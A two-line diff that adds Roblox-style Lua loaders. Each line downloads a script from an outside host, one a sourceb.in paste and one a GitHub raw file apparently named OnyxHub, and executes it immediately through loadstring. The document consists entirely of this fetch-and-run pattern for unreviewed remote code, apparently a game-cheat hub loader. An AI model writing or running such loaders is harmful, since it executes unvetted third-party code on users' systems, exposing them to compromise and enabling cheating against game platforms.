@@ -1,0 +1,2 @@
+loadstring(game:HttpGet("https://cdn.sourceb.in/bins/FqVnmwnVDr/0"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/zyntrix20/OnyxHub/refs/heads/main/Script"))()
